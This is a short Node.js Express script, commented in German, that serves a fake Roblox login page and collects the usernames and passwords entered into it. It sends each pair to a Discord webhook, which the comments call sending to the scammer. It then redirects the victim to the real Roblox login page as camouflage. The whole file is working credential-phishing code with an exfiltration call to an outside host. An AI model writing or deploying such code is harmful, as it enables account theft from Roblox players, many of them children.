// 1. Webserver einrichten
const express = require('express');
const app = express();

// 2. Middleware, um Formulardaten zu lesen
app.use(express.urlencoded({ extended: true }));

// 3. Die gefälschte Login-Seite ausliefern
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/j.index.html');
});

// 4. Die eingegebenen Daten "empfangen"
app.post('/login', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    // 5. Daten an den Betrüger senden (hier: Discord-Webhook)
    fetch('https://discord.com/api/webhooks/...', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: `Neuer Login: ${username} / ${password}`
        })
    });

    // 6. Opfer zur echten Roblox-Seite weiterleiten (Tarnung)
    res.redirect('https://www.roblox.com/login');
});

// 7. Server starten
app.listen(3000, () => console.log('Server läuft auf Port 3000'));
